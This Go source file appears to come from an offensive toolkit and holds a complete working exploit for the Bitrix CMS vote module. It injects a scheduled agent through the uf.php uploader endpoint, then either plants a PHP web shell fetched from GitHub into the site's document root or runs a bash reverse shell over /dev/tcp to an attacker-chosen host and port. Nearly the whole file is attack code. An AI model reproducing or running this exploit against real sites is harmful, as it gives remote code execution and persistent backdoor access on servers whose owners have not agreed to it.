package va

import (
	"bytes"
	"fmt"
	"github.com/origin-tech/quick-tricks/modules/tokens"
	"github.com/origin-tech/quick-tricks/utils/colors"
	"github.com/origin-tech/quick-tricks/utils/netclient"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

const endpoint = "/bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote"

var (
	counter int
	proxy   string
)

func Exploit(target, lhost, lport, agentId, proxyStr string, webshell bool) error {
	proxy = proxyStr
	// TODO: REPLACE WITH SWITCH CASE
	if agentId == "1" {
		agentId = "f"
	}
	if agentId == "2" {
		agentId = "l"
	}
	if agentId == "3" {
		agentId = "343"
	}
	if agentId == "4" {
		agentId = "r"
	}
	if agentId == "5" {
		agentId = "zxc"
	}
	if agentId == "6" {
		agentId = "m"
	}
	if agentId == "7" {
		agentId = "u"
	}
	if agentId == "8" {
		agentId = "dfgdfg"
	}
	if agentId == "9" {
		agentId = "x"
	}
	compositeData, cookie, err := tokens.Get(target, proxy)
	if err != nil {
		return err
	}
	if compositeData == nil {
		err = fmt.Errorf("Unable to access composite data.")
		return err
	}

	var success bool
	var resp *http.Response
	var bodyReq string

	client, err := netclient.NewHTTPClient(proxy)
	if err != nil {
		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
		return err
	}

	serverTime := compositeData.ServerTime
	serverTzOffset := compositeData.ServerTzOffset
	bitrixSessid := compositeData.BitrixSessid

	url := target + endpoint
	// Generate random name for uploading file.
	randName := randStringRunes(12)
	uploadedFile := target + "/" + randName + ".txt"
	// Loop for sending two requests.
	for r := 0; r <= 1; r++ {
		if r == 0 {
			if webshell == true {
				// Request Body to add agent that will download the web reverse shell.
				uploadedFile = target + "/" + randName + ".php"
				bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"

file_put_contents($_SERVER['DOCUMENT_ROOT']."/%s.php", fopen("https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php", "r"));
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, randName, agentId, bitrixSessid)
			} else {
				// Request Body to add agent that will create dummy file to check if target is vulnerable.
				// DO NOT ADD TABS!!!
				bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"

file_put_contents($_SERVER['DOCUMENT_ROOT']."/%s.txt", "%s\n");
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, randName, randName, agentId, bitrixSessid)
			}
		}

		if r == 1 {
			gmtTimeLoc := time.FixedZone("GMT", 0)
			dateUnix := serverTime + serverTzOffset + 20
			date := time.Unix(int64(dateUnix), 0)
			// DO NOT ADD TABS!!!
			// Body for the second request to change agent time.
			bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NEXT_EXEC]"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, date.In(gmtTimeLoc).Format("02.01.2006 15:04:05"), agentId, bitrixSessid)
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(bodyReq)))
		req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------xxxxxxxxxxxx")
		req.AddCookie(cookie)

		resp, err = client.Do(req)
		if err != nil {
			return err
		}
		if resp.StatusCode == 200 {
			body, _ := io.ReadAll(resp.Body)
			if len(body) != 0 {
				if strings.Contains(string(body), "Connector class should be instance of Bitrix\\\\Vote\\\\Attachment\\\\Connector") {
					colors.BAD.Println("Vote agent module is not vulnerable.")
					return nil
				}
			}
		}
	}

	fmt.Println("Vote agent might be vulnerable! Waiting 30 sec for agent activation...")
	time.Sleep(30 * time.Second)

	success, err = checkUploadedFile(uploadedFile, randName, webshell)
	if success == true && webshell == true {
		fmt.Printf("The target's vote module is vulnerable! Web shell is uploaded, check %s", uploadedFile)
		return nil
	}
	if success == true && webshell == false {
		colors.OK.Println("The target's vote module is vulnerable! Preparing reverse shell connection.")
		time.Sleep(10 * time.Second)

		err := reverseShellPayload(target, lhost, lport, agentId)
		time.Sleep(10 * time.Second)
		if err != nil {
			fmt.Printf("Unable to establish reverse shell connection: %s", err.Error())
		}
	} else if !success {
		for counter = 1; counter <= 3; counter++ {
			colors.BAD.Printf("Failed, trying one more time... [%d/3]\n", counter)
			time.Sleep(3 * time.Second)
			success, err = checkUploadedFile(uploadedFile, randName, webshell)
			if success && webshell == true {
				fmt.Printf("The target's vote module is vulnerable! Web shell is uploaded, check %s", uploadedFile)
				return nil
			} else if success && webshell == false {
				colors.OK.Println("The target's vote module is vulnerable! Preparing reverse shell connection.")
				err := reverseShellPayload(target, lhost, lport, agentId)
				if err != nil {
					fmt.Printf("Unable to establish reverse shell connection: %s", err.Error())
				}
				return nil
			} else {
				continue
			}
		}
		colors.BAD.Println("The target's vote agent might be dead, try another vote agent's ID!")
	}
	return nil
}
func checkUploadedFile(uploadedFile, randName string, webshell bool) (bool, error) {
	var bodyReq string
	var resp *http.Response

	client, err := netclient.NewHTTPClient(proxy)
	if err != nil {
		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
		return false, err
	}

	req, err := http.NewRequest("GET", uploadedFile, bytes.NewBuffer([]byte(bodyReq)))
	resp, err = client.Do(req)
	if err != nil {
		return false, err
	}

	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		if webshell == true {
			if strings.Contains(string(body), "Web Shell") {
				return true, nil
			}
		} else {
			if strings.Contains(string(body), randName) {
				return true, nil
			}
		}
	} else if resp.StatusCode == 404 && counter <= 2 {
		return false, nil
	}

	return false, nil
}

func randStringRunes(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UnixNano())
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func reverseShellPayload(target, localHost, localPort, agentId string) error {
	compositeData, cookie, err := tokens.Get(target, proxy)
	if err != nil {
		return err
	}
	if compositeData == nil {
		err = fmt.Errorf("Unable to access composite data.")
		return err
	}

	client, err := netclient.NewHTTPClient(proxy)
	if err != nil {
		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
		return err
	}

	var bodyReq string
	serverTime := compositeData.ServerTime
	serverTzOffset := compositeData.ServerTzOffset
	bitrixSessid := compositeData.BitrixSessid
	url := target + endpoint
	for r := 0; r <= 1; r++ {
		// DO NOT ADD TABS!!!
		if r == 0 {
			bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"

system('/bin/bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"');
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, localHost, localPort, agentId, bitrixSessid)
		}
		if r == 1 {
			gmtTimeLoc := time.FixedZone("GMT", 0)
			dateUnix := serverTime + serverTzOffset + 20
			date := time.Unix(int64(dateUnix), 0)
			// DO NOT ADD TABS!!!
			bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NEXT_EXEC]"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, date.In(gmtTimeLoc).Format("02.01.2006 15:04:05"), agentId, bitrixSessid)
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(bodyReq)))
		req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------xxxxxxxxxxxx")
		req.AddCookie(cookie)

		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		if resp.StatusCode != 200 {
			return nil
		}
	}

	return nil
}
